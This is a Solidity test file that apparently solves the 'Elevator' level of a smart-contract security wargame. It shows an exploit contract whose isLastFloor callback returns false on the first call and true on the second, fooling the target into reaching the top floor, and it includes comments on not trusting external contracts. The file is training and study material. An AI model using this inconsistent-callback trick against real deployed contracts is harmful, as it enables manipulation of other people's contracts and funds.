// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Elevator.sol";
import "src/levels/ElevatorFactory.sol";

contract TestElevator is BaseTest {
    Elevator private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.top(), false);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Never ever trust anything that is a blackbox
        // If you need to do an integration with an external contract/protocol
        // always look for the documentation and the source code
        // will they act as expected? are they upgradable? can you trust the team?
        // In this case, our `Exploiter` contract just returned what we wanted to return
        // to pass the challenge without even caring about the `floor` they passed to us
        // to know if it was the last one or not

        Exploiter exploiter = new Exploiter(level);
        exploiter.goTo(0);

        assertEq(level.top(), true);

        vm.stopPrank();
    }
}

contract Exploiter is Building {
    Elevator private victim;
    address private owner;
    bool firstCall;

    constructor(Elevator _victim) public {
        owner = msg.sender;
        victim = _victim;
        firstCall = true;
    }

    function goTo(uint256 floor) public {
        victim.goTo(floor);
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}
